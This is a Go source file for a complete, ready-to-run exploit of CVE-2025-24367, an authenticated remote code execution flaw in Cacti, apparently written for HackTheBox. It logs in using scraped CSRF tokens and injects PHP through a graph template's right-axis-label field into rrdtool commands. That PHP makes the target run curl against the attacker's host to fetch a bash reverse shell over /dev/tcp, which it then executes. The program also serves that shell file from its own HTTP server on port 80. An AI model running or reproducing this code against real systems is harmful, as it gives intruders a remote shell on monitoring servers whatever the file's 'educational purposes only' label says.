package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

const (
	defaultTimeout   = 30 * time.Second
	defaultProxyAddr = "http://127.0.0.1:8080"
	serverPort       = ":80"
)

type ExploitStage string

const (
	StageWrite   ExploitStage = "write"
	StageTrigger ExploitStage = "trigger"
)

type Credentials struct {
	Username string
	Password string
}

type ReverseShellConfig struct {
	IP   string
	Port string
}

type ExploitConfig struct {
	BaseURL      string
	Credentials  Credentials
	ReverseShell ReverseShellConfig
	ProxyURL     *url.URL
	Debug        bool
}

type Exploit struct {
	config ExploitConfig
	client *http.Client
	server *http.Server
}

type TemplatePayload struct {
	TemplateID     int
	Filename       string
	CSRFToken      string
	RightAxisLabel string
}

func main() {
	config, err := parseFlags()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n\n", err)
		flag.Usage()
		os.Exit(1)
	}

	printBanner()

	exploit := NewExploit(config)

	if err := exploit.Run(); err != nil {
		fmt.Printf("[!] Exploit failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Exploit completed successfully!")
}

func printBanner() {
	fmt.Println("###########################################################")
	fmt.Println("#                                                         #")
	fmt.Println("# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #")
	fmt.Println("#         Created by TheCyberGeek @ HackTheBox            #")
	fmt.Println("#             For educational purposes only               #")
	fmt.Println("#                                                         #")
	fmt.Println("###########################################################")
	fmt.Println()
}

func parseFlags() (ExploitConfig, error) {
	var config ExploitConfig

	username := flag.String("u", "", "Username for authentication")
	password := flag.String("p", "", "Password for authentication")
	reverseIP := flag.String("i", "", "IP address for reverse shell")
	reversePort := flag.String("l", "", "Port number for reverse shell")
	baseURL := flag.String(
		"url",
		"",
		"Base URL of Cacti (e.g., http://target.com)",
	)
	useProxy := flag.Bool(
		"proxy",
		false,
		"Enable HTTP proxy at http://127.0.0.1:8080",
	)
	debug := flag.Bool(
		"debug",
		false,
		"Enable debug output",
	)

	flag.Usage = func() {
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"CVE-2025-24367 - Cacti Authenticated Graph Template RCE\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"Created by TheCyberGeek @ HackTheBox\n\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"Usage: %s [OPTIONS]\n\n",
			os.Args[0],
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Required Options:\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -u string\n")
		fmt.Fprintf(flag.CommandLine.Output(), "    	Username for authentication\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -p string\n")
		fmt.Fprintf(flag.CommandLine.Output(), "    	Password for authentication\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -i string\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	IP address for reverse shell\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "  -l string\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Port number for reverse shell\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "  -url string\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Base URL of Cacti instance (e.g., http://target.com)\n\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Optional:\n")
		fmt.Fprintf(flag.CommandLine.Output(), "  -proxy\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Enable HTTP proxy at http://127.0.0.1:8080\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "  -debug\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"    	Enable debug output\n\n",
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Examples:\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  sudo %s -u admin -p password -i 10.10.14.5 -l 4444 "+
				"-url http://target.com\n",
			os.Args[0],
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  sudo %s -u admin -p password -i 10.10.14.5 -l 4444 "+
				"-url http://target.com -proxy -debug\n\n",
			os.Args[0],
		)
		fmt.Fprintf(flag.CommandLine.Output(), "Notes:\n")
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  • Requires root/sudo privileges to bind port 80\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  • Start listener before running: nc -lvnp <port>\n",
		)
		fmt.Fprintf(
			flag.CommandLine.Output(),
			"  • For educational and authorized testing only\n",
		)
	}

	flag.Parse()

	if *username == "" {
		return config, fmt.Errorf("username (-u) is required")
	}
	if *password == "" {
		return config, fmt.Errorf("password (-p) is required")
	}
	if *reverseIP == "" {
		return config, fmt.Errorf("reverse shell IP (-i) is required")
	}
	if *reversePort == "" {
		return config, fmt.Errorf("reverse shell port (-l) is required")
	}
	if *baseURL == "" {
		return config, fmt.Errorf("base URL (-url) is required")
	}

	config.BaseURL = strings.TrimSuffix(*baseURL, "/")
	config.Credentials = Credentials{
		Username: *username,
		Password: *password,
	}
	config.ReverseShell = ReverseShellConfig{
		IP:   *reverseIP,
		Port: *reversePort,
	}
	config.Debug = *debug

	if *useProxy {
		proxyURL, err := url.Parse(defaultProxyAddr)
		if err != nil {
			return config, fmt.Errorf("invalid proxy URL: %w", err)
		}
		config.ProxyURL = proxyURL
	}

	return config, nil
}

func NewExploit(config ExploitConfig) *Exploit {
	transport := &http.Transport{}
	if config.ProxyURL != nil {
		transport.Proxy = http.ProxyURL(config.ProxyURL)
		fmt.Printf("[i] Using proxy: %s\n", config.ProxyURL.String())
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   defaultTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
		Jar: &cookieJar{cookies: make(map[string][]*http.Cookie)},
	}

	return &Exploit{
		config: config,
		client: client,
	}
}

func (e *Exploit) Run() error {
	steps := []struct {
		name string
		fn   func() error
	}{
		{"Checking Cacti instance", e.checkCacti},
		{"Starting HTTP server", e.startHTTPServer},
		{"Authenticating", e.login},
		{"Getting template ID", func() error {
			templateID, err := e.getTemplateID()
			if err != nil {
				return err
			}
			return e.executePayloadChain(templateID)
		}},
	}

	defer func() {
		e.stopHTTPServer()
		os.Remove("bash")
	}()

	for _, step := range steps {
		fmt.Printf("[*] %s...\n", step.name)
		if err := step.fn(); err != nil {
			return fmt.Errorf("%s: %w", step.name, err)
		}
	}

	return nil
}

func (e *Exploit) executePayloadChain(templateID int) error {
	if err := e.writePayloadFile(); err != nil {
		return fmt.Errorf("writing payload: %w", err)
	}

	if err := e.triggerPayload(templateID, StageWrite); err != nil {
		return fmt.Errorf("writing payload to server: %w", err)
	}

	if err := e.triggerPayload(templateID, StageTrigger); err != nil {
		return fmt.Errorf("triggering payload: %w", err)
	}

	return nil
}

func (e *Exploit) checkCacti() error {
	resp, err := http.Get(e.config.BaseURL)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	bodyString := string(bodyBytes)

	if e.config.Debug {
		fmt.Printf("[DEBUG] Check response length: %d\n", len(bodyString))
	}

	if strings.Contains(bodyString, "Cacti") {
		fmt.Println("[+] Cacti instance detected!")
		return nil
	}

	return fmt.Errorf("no Cacti instance found at target URL")
}

func (e *Exploit) login() error {
	loginURL := e.config.BaseURL

	if e.config.Debug {
		fmt.Printf("[DEBUG] Fetching login page: %s\n", loginURL)
	}

	resp, err := e.client.Get(loginURL)
	if err != nil {
		return fmt.Errorf("fetching login page: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("reading response body: %w", err)
	}
	bodyString := string(bodyBytes)

	if e.config.Debug {
		fmt.Printf("[DEBUG] Login page response length: %d\n", len(bodyString))
		fmt.Printf(
			"[DEBUG] First 500 chars: %s\n",
			bodyString[:min(500, len(bodyString))],
		)
	}

	csrfToken := extractCSRFToken(bodyString)
	if csrfToken == "" {
		if e.config.Debug {
			fmt.Println("[DEBUG] Full page content:")
			fmt.Println(bodyString)
		}
		return fmt.Errorf("failed to extract CSRF token")
	}

	if e.config.Debug {
		fmt.Printf("[DEBUG] Extracted CSRF token: %s\n", csrfToken)
	}

	data := url.Values{
		"__csrf_magic":   {csrfToken},
		"action":         {"login"},
		"login_username": {e.config.Credentials.Username},
		"login_password": {e.config.Credentials.Password},
	}

	postURL := e.config.BaseURL + "/cacti/index.php"
	if e.config.Debug {
		fmt.Printf("[DEBUG] Posting login to: %s\n", postURL)
	}

	resp, err = e.client.PostForm(postURL, data)
	if err != nil {
		return fmt.Errorf("posting login form: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err = io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("reading login response: %w", err)
	}
	bodyString = string(bodyBytes)

	if e.config.Debug {
		fmt.Printf("[DEBUG] Login response length: %d\n", len(bodyString))
		fmt.Printf(
			"[DEBUG] Contains 'Console': %v\n",
			strings.Contains(bodyString, "Console"),
		)
	}

	if strings.Contains(bodyString, "Console") {
		fmt.Println("[+] Login Successful!")
		return nil
	}

	return fmt.Errorf("authentication failed - check credentials")
}

// IMPORTANT: fixed URL building here
func (e *Exploit) getTemplateID() (int, error) {
	// Build URL like Python but with proper encoding of query parameters
	u, err := url.Parse(e.config.BaseURL + "/cacti/graph_templates.php")
	if err != nil {
		return 0, fmt.Errorf("parsing base graph_templates URL: %w", err)
	}

	q := u.Query()
	q.Set("filter", "Unix - Logged in Users")
	q.Set("rows", "-1")
	q.Set("has_graphs", "false")
	u.RawQuery = q.Encode()
	targetURL := u.String()

	if e.config.Debug {
		fmt.Printf("[DEBUG] Fetching template URL: %s\n", targetURL)
	}

	resp, err := e.client.Get(targetURL)
	if err != nil {
		return 0, fmt.Errorf("fetching template list: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}
	bodyString := string(bodyBytes)

	if e.config.Debug {
		fmt.Printf(
			"[DEBUG] Template search response length: %d\n",
			len(bodyString),
		)
	}

	doc, err := goquery.NewDocumentFromReader(strings.NewReader(bodyString))
	if err != nil {
		return 0, err
	}

	if e.config.Debug {
		fmt.Println("[DEBUG] Looking for template checkboxes...")
		doc.Find("input[type='checkbox']").Each(func(i int, s *goquery.Selection) {
			if id, exists := s.Attr("id"); exists {
				fmt.Printf("[DEBUG] Found checkbox ID: %s\n", id)
			}
		})
	}

	var templateID int
	doc.Find("input[id^='chk_']").Each(func(i int, s *goquery.Selection) {
		if id, exists := s.Attr("id"); exists {
			var tid int
			fmt.Sscanf(id, "chk_%d", &tid)
			if templateID == 0 {
				templateID = tid
			}
			if e.config.Debug {
				fmt.Printf("[DEBUG] Found template ID from '%s': %d\n", id, tid)
			}
		}
	})

	if templateID == 0 {
		if e.config.Debug {
			fmt.Println("[DEBUG] Dumping page content for inspection:")
			fmt.Println(bodyString[:min(2000, len(bodyString))])
		}
		return 0, fmt.Errorf("failed to locate graph template ID")
	}

	fmt.Printf("[+] Got graph ID: %d\n", templateID)
	return templateID, nil
}

func (e *Exploit) writePayloadFile() error {
	payload := fmt.Sprintf(
		"#!/bin/bash\nbash -i >& /dev/tcp/%s/%s 0>&1",
		e.config.ReverseShell.IP,
		e.config.ReverseShell.Port,
	)
	if err := os.WriteFile("bash", []byte(payload), 0644); err != nil {
		return fmt.Errorf("writing payload file: %w", err)
	}
	if e.config.Debug {
		fmt.Println("[DEBUG] Created payload file")
	}
	return nil
}

func (e *Exploit) triggerPayload(
	templateID int,
	stage ExploitStage,
) error {
	payload, err := e.buildTemplatePayload(templateID, stage)
	if err != nil {
		return err
	}

	if err := e.updateTemplate(payload); err != nil {
		return fmt.Errorf("updating template: %w", err)
	}

	if err := e.triggerExecution(); err != nil {
		return fmt.Errorf("triggering execution: %w", err)
	}

	return e.checkPayloadExecution(payload.Filename, stage)
}

func (e *Exploit) buildTemplatePayload(
	templateID int,
	stage ExploitStage,
) (*TemplatePayload, error) {
	targetURL := fmt.Sprintf(
		"%s/cacti/graph_templates.php?action=template_edit&id=%d",
		e.config.BaseURL,
		templateID,
	)

	if e.config.Debug {
		fmt.Printf("[DEBUG] Fetching template edit page: %s\n", targetURL)
	}

	resp, err := e.client.Get(targetURL)
	if err != nil {
		return nil, fmt.Errorf("fetching template page: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	bodyString := string(bodyBytes)

	csrfToken := extractCSRFToken(bodyString)
	if csrfToken == "" {
		return nil, fmt.Errorf("failed to extract CSRF token")
	}

	if e.config.Debug {
		fmt.Printf("[DEBUG] Template page CSRF token: %s\n", csrfToken)
	}

	filename := randomString(5) + ".php"
	fmt.Printf("[i] Created PHP filename: %s\n", filename)

	var rightAxisLabel string
	if stage == StageWrite {
		rightAxisLabel = fmt.Sprintf(
			"XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "+
				"RRA:AVERAGE:0.5:1:1200\ngraph %s -s now -a CSV "+
				"DEF:out=my.rrd:temp:AVERAGE "+
				"LINE1:out:<?=`curl\\x20%s/bash\\x20-o\\x20bash`;?>\n",
			filename,
			e.config.ReverseShell.IP,
		)
	} else {
		rightAxisLabel = fmt.Sprintf(
			"XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "+
				"RRA:AVERAGE:0.5:1:1200\ngraph %s -s now -a CSV "+
				"DEF:out=my.rrd:temp:AVERAGE "+
				"LINE1:out:<?=`bash\\x20bash`;?>\n",
			filename,
		)
	}

	return &TemplatePayload{
		TemplateID:     templateID,
		Filename:       filename,
		CSRFToken:      csrfToken,
		RightAxisLabel: rightAxisLabel,
	}, nil
}

func (e *Exploit) updateTemplate(payload *TemplatePayload) error {
	data := url.Values{
		"__csrf_magic":            {payload.CSRFToken},
		"name":                    {"Unix - Logged in Users"},
		"graph_template_id":       {fmt.Sprintf("%d", payload.TemplateID)},
		"graph_template_graph_id": {fmt.Sprintf("%d", payload.TemplateID)},
		"save_component_template": {"1"},
		"title":                   {"|host_description| - Logged in Users"},
		"vertical_label":          {"percent"},
		"image_format_id":         {"3"},
		"height":                  {"200"},
		"width":                   {"700"},
		"base_value":              {"1000"},
		"slope_mode":              {"on"},
		"auto_scale":              {"on"},
		"auto_scale_opts":         {"2"},
		"auto_scale_rigid":        {"on"},
		"upper_limit":             {"100"},
		"lower_limit":             {"0"},
		"unit_value":              {""},
		"unit_exponent_value":     {""},
		"unit_length":             {""},
		"right_axis":              {""},
		"right_axis_label":        {payload.RightAxisLabel},
		"right_axis_format":       {"0"},
		"right_axis_formatter":    {"0"},
		"left_axis_formatter":     {"0"},
		"auto_padding":            {"on"},
		"tab_width":               {"30"},
		"legend_position":         {"0"},
		"legend_direction":        {"0"},
		"rrdtool_version":         {"1.7.2"},
		"action":                  {"save"},
	}

	postURL := e.config.BaseURL + "/cacti/graph_templates.php?header=false"
	if e.config.Debug {
		fmt.Printf("[DEBUG] Updating template at: %s\n", postURL)
	}

	_, err := e.client.PostForm(postURL, data)
	return err
}

func (e *Exploit) triggerExecution() error {
	triggerURL := e.config.BaseURL +
		"/cacti/graph_json.php?rra_id=0&local_graph_id=3" +
		"&graph_start=1761683272&graph_end=1761769672" +
		"&graph_height=200&graph_width=700"

	if e.config.Debug {
		fmt.Printf("[DEBUG] Triggering execution at: %s\n", triggerURL)
	}

	_, err := e.client.Get(triggerURL)
	return err
}

func (e *Exploit) checkPayloadExecution(
	filename string,
	stage ExploitStage,
) error {
	client := *e.client
	client.Timeout = 2 * time.Second

	checkURL := e.config.BaseURL + "/cacti/" + filename
	if e.config.Debug {
		fmt.Printf("[DEBUG] Checking payload at: %s\n", checkURL)
	}

	resp, err := client.Get(checkURL)
	if err != nil && stage == StageTrigger {
		fmt.Println("[+] Hit timeout, looks good for shell, check your listener!")
		return nil
	}
	if err != nil {
		return fmt.Errorf("checking payload: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(bodyBytes), "File not found") {
		return fmt.Errorf("exploit failed to execute - file not found")
	}

	if stage == StageWrite && e.config.Debug {
		fmt.Println("[DEBUG] Payload uploaded successfully")
	}

	return nil
}

func (e *Exploit) startHTTPServer() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/bash" {
			fmt.Printf("[+] Got payload: %s\n", r.URL.Path)
			http.ServeFile(w, r, "bash")
		} else if e.config.Debug {
			fmt.Printf("[DEBUG] HTTP request: %s\n", r.URL.Path)
		}
	})

	e.server = &http.Server{Addr: serverPort, Handler: mux}

	go func() {
		if err := e.server.ListenAndServe(); err != nil &&
			err != http.ErrServerClosed {
			fmt.Printf("[!] HTTP server error: %v\n", err)
		}
	}()

	time.Sleep(100 * time.Millisecond)
	fmt.Printf("[+] Serving HTTP on port %s\n", serverPort)
	return nil
}

func (e *Exploit) stopHTTPServer() {
	if e.server != nil {
		ctx, cancel := context.WithTimeout(
			context.Background(),
			5*time.Second,
		)
		defer cancel()
		e.server.Shutdown(ctx)
		fmt.Println("[+] Stopped HTTP server on port 80")
	}
}

func extractCSRFToken(text string) string {
	patterns := []string{
		`var csrfMagicToken\s*=\s*"(sid:[a-z0-9]+,[a-z0-9]+)`,
		`var csrfMagicToken\s*=\s*"(sid:[a-zA-Z0-9]+,[a-zA-Z0-9]+)`,
		`__csrf_magic"\s+value="([^"]+)"`,
		`csrfMagicToken\s*=\s*"([^"]+)"`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(text)
		if len(matches) > 1 {
			return matches[1]
		}
	}

	return ""
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz" +
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

type cookieJar struct {
	cookies map[string][]*http.Cookie
}

func (j *cookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.cookies[u.Host] = cookies
}

func (j *cookieJar) Cookies(u *url.URL) []*http.Cookie {
	return j.cookies[u.Host]
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
